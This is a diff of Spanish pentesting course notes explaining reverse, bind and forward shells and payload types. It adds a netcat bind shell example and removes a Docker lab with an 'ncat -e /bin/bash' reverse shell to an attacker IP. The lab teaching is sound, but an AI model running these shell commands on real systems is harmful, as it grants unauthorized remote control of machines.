@@ -1853,70 +1853,18 @@ Por último, se introducirá la herramienta BurpSuite, una suite de herramientas
 En esta clase, veremos las diferencias entre Reverse Shell, Bind Shell y Forward Shell:
 
 * Reverse Shell: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.
+
 * Bind Shell: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.
+
+```bash
+# Victima
+# Ofrecemos una bash en el puerto 4646
+nc -nlvp 4646 -e /bin/bash
+
+# Atacante
+nc ipVictima 4646 # Ganamos acceso a una bash
+```
+
 * Forward Shell: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de mkfifo, que crea un archivo FIFO (named pipe), que se utiliza como una especie de “consola simulada” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo FIFO, lo que permite la comunicación bidireccional con la máquina remota.
 
 Es importante entender las diferencias entre estas técnicas para poder determinar cuál es la mejor opción en función del escenario de ataque y las limitaciones de la red.
-
-```bash
-# Practica de reverse shell -----------------------------------------------------------
-# Creamos archivo docker que será nuestra máquina victima
-mkdir shell
-cd !$
-mkdir reverse
-cd !$
-nano dockerfile
-# --------------- Inicia archivo dockerfile
-FROM ubuntu:latest
-
-ENV DEBIAN_FRONTEND noninteractive
-
-RUN apt update && apt install -y apache2 \
-    php \
-    ncat
-
-EXPOSE 80
-
-ENTRYPOINT service apache2 start && /bin/bash
-# --------------- Fin archivo dockerfile
-
-docker build -t mi_imagen . # Construimos una imagen basada en el archivo dockerfile de este mismo directorio
-docker images # Vemos que la imagen esté creada
-docker run -dit -p 80:80 --name miContenedor mi_imagen # -detached iterative tty, el puerto 80 del contenedor será nuestro puerto 80, damos nombre al contenedor creado a partir de una imagen.
-docker ps # Validamos que el contenedor haya sido creado
-docker exec -it miContenedor bash # Nos conectamos al contenedor con una terminal iterativa solicitando una bash
-
-# En la maquina atacante
-ncat -nlvp 443 # Nos ponemos en escucha, n= no dns, l= listen, v= verbose, p= especificar el puerto, damos enter
-
-# En el contenedor victima
-ncat -e /bin/bash 172.17.0.1 443 # Entablar, enviar una bash a la ip del atacante
-
-# En la maquina atacante
-# Abremos recibido una bash
-script /dev/null -c bash
-# Obtenemos acceso a la shell 
-
-
-
-# Practica de bind shell -----------------------------------------------------------
-# Maquina victima
-nc -nlvp 443 -e /bin/bash # Omitimos dns, nos ponemos en escucha, añadimos verbose para el puerto 443, ofreciendo una bash
-
-# Maquina atacante
-nc 172.17.0.2 443 # Ganamos acceso a la bash de la victima
-```
-
-[Pentestmonkey.net](https://pentestmonkey-net.translate.goog/cheat-sheet/shells/reverse-shell-cheat-sheet?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc)
-
-### Tipos de payloads (Staged y Non-Staged)
-
-En esta clase, veremos los dos tipos de payloads utilizados en ataques informáticos: Staged y Non-Staged.
-
-* Payload Staged: Es un tipo de payload que se divide en dos o más etapas. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.
-
-* Payload Non-Staged: Es un tipo de payload que se envía como una sola entidad y no se divide en múltiples etapas. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.
-
-Es importante tener en cuenta que el tipo de payload utilizado en un ataque dependerá del objetivo y de las medidas de seguridad implementadas. En general, los payloads Staged son más difíciles de detectar y son preferidos por los atacantes, mientras que los payloads Non-Staged son más fáciles de implementar pero también son más fáciles de detectar.
-
-testing updates
